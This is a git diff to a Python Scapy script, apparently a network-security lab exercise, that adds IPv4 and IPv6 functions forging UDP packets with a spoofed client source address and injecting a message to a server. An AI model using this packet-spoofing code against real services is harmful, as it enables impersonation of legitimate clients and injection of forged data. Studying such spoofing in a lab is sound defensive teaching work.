@@ -1,5 +1,6 @@
 import argparse
 from scapy.all import *
+from ipaddress import IPv6Address
 
 
 def hack_client(
@@ -8,6 +9,30 @@ def hack_client(
     """
     Function that hacks the client by intercepting and modifying UDP packets
     """
+
+    packet = (
+        IP(src=client_ip, dst=server_ip)
+        / UDP(sport=client_port, dport=server_port)
+        / Raw(load=f"{message}\n".encode())
+    )
+    
+    print(f"Packet to send: {packet[Raw].load}")
+
+    send(
+        packet,
+        verbose=0,
+        # iface="lo",
+    )
+    
+    
+def hack_client_ipv6(
+    message: str, client_ip: str, client_port: int, server_ip: str, server_port: int
+) -> None:
+    """
+    Function that hacks the client by intercepting and modifying UDP packets
+    """
+    client_ip = str(IPv6Address(client_ip))
+    server_ip = str(IPv6Address(server_ip))
 
     packet = (
         IPv6(src=client_ip, dst=server_ip)
@@ -68,3 +93,11 @@ if __name__ == "__main__":
         server_ip=args.server_ip,
         server_port=args.server_port,
     )
+    
+    # hack_client_ipv6(
+    #     message="Hola, soy un paquete UDP inyectado",
+    #     client_ip=args.client_ip,
+    #     client_port=args.client_port,
+    #     server_ip=args.server_ip,
+    #     server_port=args.server_port,
+    # )
